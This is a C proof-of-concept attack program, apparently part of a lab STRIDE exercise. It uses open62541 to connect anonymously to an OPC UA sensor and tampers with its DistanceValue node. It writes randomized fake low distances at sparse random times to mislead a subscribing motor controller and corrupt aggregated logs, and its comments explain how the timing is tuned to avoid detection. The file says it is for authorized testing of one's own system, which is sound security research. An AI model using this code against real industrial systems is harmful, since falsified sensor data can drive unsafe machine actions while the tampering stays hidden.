// =============================================================================
// STRIDE - T (Tampering / 竄改) 攻擊 PoC
// =============================================================================
// 目標：sensor@4842 的 DistanceValue 節點（sensor 量到的距離）。
//
// 弱點：sensor 用 UA_ServerConfig_setMinimal，只開 SecurityPolicy#None + 匿名。
//       封包無簽章、無加密，任何匿名 client 都能連上並嘗試寫入節點。
//
// 手法（高隱蔽稀疏竄改）：本程式連上 sensor，偶爾才試著把 DistanceValue 悄悄
//       改寫成「不合理但看似可信」的值。因為 motor 與 aggregation_server 都
//       『訂閱』DistanceValue，一旦竄改成功，兩邊同時收到假距離：
//         - motor 可能被誘導做出錯誤的馬達動作（例如該轉不轉／該停不停）
//         - aggregation_server 把污染值寫進 AggregatedDistance、log 也被污染
//       這就是「未授權修改資料」。
//
// 隱蔽設計（相對舊版的改進）：
//   1. 稀疏：整段只試寫 N_WRITES 次，在 baseline 期間「隨機時間點」散佈，
//      不再 50ms 狂寫 200 次那樣噴出一大坨 BadUserAccessDenied。
//   2. 每次改寫的假值也用亂數，不固定，避免值特徵。
//   → 目的：把竄改嘗試稀釋進 baseline，讓它不像「洪水」那樣一眼可辨。
//
// ⚠️ 重要觀察點：sensor 的 DistanceValue 設了 accessLevel = READ。本程式會探測
//       寫入是否被拒。「寫入被拒（BadUserAccessDenied）」本身就是重要結果：
//       代表 accessLevel 這道防線有效，竄改在傳輸層失敗。稀疏化後，每次被拒
//       只留下零星一筆痕跡，需要跨時間關聯才能察覺。如實記錄。
//
// ⚠️ 僅用於你自己機器上、你自己系統的授權安全測試。
// =============================================================================
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <open62541/client_config_default.h>
#include <open62541/client_highlevel.h>

// ---- 可調參數 ----
#ifndef N_WRITES
#define N_WRITES        3      // 整段共嘗試竄改幾次
#endif
#ifndef BASELINE_SEC
#define BASELINE_SEC    300    // 潛伏總時長（秒），與 spoof 一致
#endif
#define FAKE_MIN        5.0    // 假距離下界（刻意偏低，誘導 motor 誤判「太近」）
#define FAKE_MAX        15.0   // 假距離上界（仍 < SAFE_DISTANCE=20）

static volatile UA_Boolean running = true;
static void stopHandler(int sig) { (void)sig; running = false; }

static UA_StatusCode read_distance(UA_Client *client, UA_Double *out) {
    UA_Variant v; UA_Variant_init(&v);
    UA_StatusCode rc = UA_Client_readValueAttribute(client, UA_NODEID_STRING(1, "DistanceValue"), &v);
    if (rc == UA_STATUSCODE_GOOD && UA_Variant_hasScalarType(&v, &UA_TYPES[UA_TYPES_DOUBLE]))
        *out = *(UA_Double *)v.data;
    UA_Variant_clear(&v);
    return rc;
}

static UA_StatusCode write_distance(UA_Client *client, UA_Double val) {
    UA_Variant v;
    UA_Variant_setScalar(&v, &val, &UA_TYPES[UA_TYPES_DOUBLE]);
    return UA_Client_writeValueAttribute(client, UA_NODEID_STRING(1, "DistanceValue"), &v);
}

int main(int argc, char **argv) {
    signal(SIGINT, stopHandler);
    signal(SIGTERM, stopHandler);

    // 目標 sensor port：預設 4842（sensor 1，與改造前完全一致）。
    // 多 pair 拓樸下用參數指到 sensor i：port = 4841 + sensor_id。
    //   用法：tamper_attack [sensor_id>=1]     例：tamper_attack 3 → 打 4844
    // 保持既有無參數行為不變，既有腳本/資料不受影響。
    int tamper_port = 4842;
    if (argc > 1) {
        int sid = atoi(argv[1]);
        if (sid < 1) { fprintf(stderr, "用法: %s [sensor_id>=1]\n", argv[0]); return 2; }
        tamper_port = 4841 + sid;
    }
    char tamper_url[64];
    snprintf(tamper_url, sizeof(tamper_url), "opc.tcp://127.0.0.1:%d", tamper_port);

    UA_Client *client = UA_Client_new();
    UA_ClientConfig_setDefault(UA_Client_getConfig(client));

    printf("[TAMPER] Connecting to sensor@%d (anonymous, no auth)...\n", tamper_port);
    UA_StatusCode rc = UA_Client_connect(client, tamper_url);
    if (rc != UA_STATUSCODE_GOOD) {
        printf("[TAMPER] Connect failed: %s\n", UA_StatusCode_name(rc));
        UA_Client_delete(client);
        return 1;
    }
    printf("[TAMPER] Connected.\n");

    // 先讀一次基準值，確認節點可讀、看看 sensor 現在報多少。
    UA_Double before = -1.0;
    if (read_distance(client, &before) == UA_STATUSCODE_GOOD)
        printf("[TAMPER] Current DistanceValue (before tamper): %.3f cm\n", before);

    srand((unsigned)time(NULL) ^ 0x7a3b);

    // 在 [0, BASELINE_SEC) 內隨機抽 N_WRITES 個「竄改時點」（秒），排序。
    int write_at[N_WRITES];
    for (int i = 0; i < N_WRITES; i++)
        write_at[i] = rand() % BASELINE_SEC;
    for (int i = 1; i < N_WRITES; i++) {
        int key = write_at[i], j = i - 1;
        while (j >= 0 && write_at[j] > key) { write_at[j + 1] = write_at[j]; j--; }
        write_at[j + 1] = key;
    }

    printf("[TAMPER] Lurking for %d s, sparsely attempting %d tamper writes...\n",
           BASELINE_SEC, N_WRITES);

    time_t start = time(NULL);
    int next = 0;

    while (running) {
        int elapsed = (int)(time(NULL) - start);
        if (elapsed >= BASELINE_SEC) break;

        while (next < N_WRITES && write_at[next] <= elapsed) {
            // 假距離：偏低的亂數值（誘導 motor 誤判「太近」），不固定、擬真。
            UA_Double fake = FAKE_MIN + ((double)rand() / RAND_MAX) * (FAKE_MAX - FAKE_MIN);
            UA_StatusCode wrc = write_distance(client, fake);
            printf("[TAMPER] t=%ds tamper write DistanceValue=%.3f -> %s\n",
                   elapsed, fake, UA_StatusCode_name(wrc));
            if (wrc == UA_STATUSCODE_GOOD)
                printf("[TAMPER]   >>> Write ACCEPTED! 節點可被匿名竄改（傳輸層防線失效）\n");
            next++;
        }

        UA_Client_run_iterate(client, 0);
        usleep(200000);   // 200ms 一輪，低調
    }

    printf("[TAMPER] Done (%d/%d tamper attempts). Disconnecting.\n", next, N_WRITES);
    UA_Client_disconnect(client);
    UA_Client_delete(client);
    return 0;
}
